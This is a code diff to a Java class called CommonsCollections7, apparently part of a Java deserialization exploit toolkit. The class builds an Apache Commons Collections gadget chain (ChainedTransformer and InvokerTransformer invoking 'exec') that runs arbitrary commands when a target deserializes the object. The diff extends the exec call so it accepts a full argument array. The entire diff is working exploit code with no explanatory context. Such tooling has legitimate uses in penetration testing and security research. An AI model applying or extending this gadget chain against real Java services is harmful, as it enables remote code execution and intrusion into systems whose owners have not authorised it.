@@ -49,7 +49,7 @@ public class CommonsCollections7 implements Payload {
         if (this.args != null)
             args = this.args;
         // Reusing transformer chain and LazyMap gadgets from previous payloads
-        final String[] execArgs = new String[]{args[0]};
+        final String[] execArgs = args;
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
@@ -62,8 +62,7 @@ public class CommonsCollections7 implements Payload {
                 new Class[]{Object.class, Object[].class},
                 new Object[]{null, new Object[0]}),
             new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
+                new Class[]{execArgs.length > 1 ? String[].class : String.class}, execArgs.length > 1 ? new Object[]{execArgs} : execArgs),
             new ConstantTransformer(1)};
 
         Map innerMap1 = new HashMap();
